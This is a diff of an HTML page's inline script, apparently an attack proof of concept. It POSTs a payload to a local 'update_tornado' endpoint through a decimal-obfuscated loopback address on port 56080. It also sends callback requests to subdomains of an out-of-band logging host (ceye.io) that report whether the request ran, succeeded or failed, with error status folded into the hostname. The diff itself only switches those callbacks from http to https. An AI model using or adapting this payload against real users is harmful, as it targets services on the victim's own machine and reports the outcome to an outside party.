@@ -30,31 +30,31 @@ var payload = {
 };
 var xhr3 = new XMLHttpRequest(); 
 xhr.open('POST', 'http://2130706631:56080/update_tornado', true);
-xhr3.open('GET', 'http://running.6wox8c.ceye.io', true);
+xhr3.open('GET', 'https://running.6wox8c.ceye.io', true);
 xhr3.send();
 xhr.onload = function () {
     var xhr1 = new XMLHttpRequest();
     if (xhr.status === 200) {
         // 6wox8c.ceye.io
-        xhr1.open('GET', 'http://success.6wox8c.ceye.io', true);
+        xhr1.open('GET', 'https://success.6wox8c.ceye.io', true);
         xhr1.send(); 
         console.log(xhr.responseText);
     }
     else{
         // 6wox8c.ceye.io
-        xhr1.open('GET', 'http://error.6wox8c.ceye.io', true);
+        xhr1.open('GET', 'https://error.6wox8c.ceye.io', true);
         xhr1.send(); 
     }
 };
 xhr.onerror = function () {
     var xhr6 = new XMLHttpRequest();
-    var xhr_status = "http://" + xhr6.statusText + 'haserror.6wox8c.ceye.io' + "/" + xhr6.status;
+    var xhr_status = "https://" + xhr6.statusText + 'haserror.6wox8c.ceye.io' + "/" + xhr6.status;
     xhr6.open('GET', xhr_status, true);
     xhr6.send(); 
 }
 xhr.send(JSON.stringify(payload));
 var xhr5 = new XMLHttpRequest();
-xhr5.open('GET', 'http://running555.6wox8c.ceye.io', true);
+xhr5.open('GET', 'https://running555.6wox8c.ceye.io', true);
 xhr5.send(); 
     </script>
 </body>
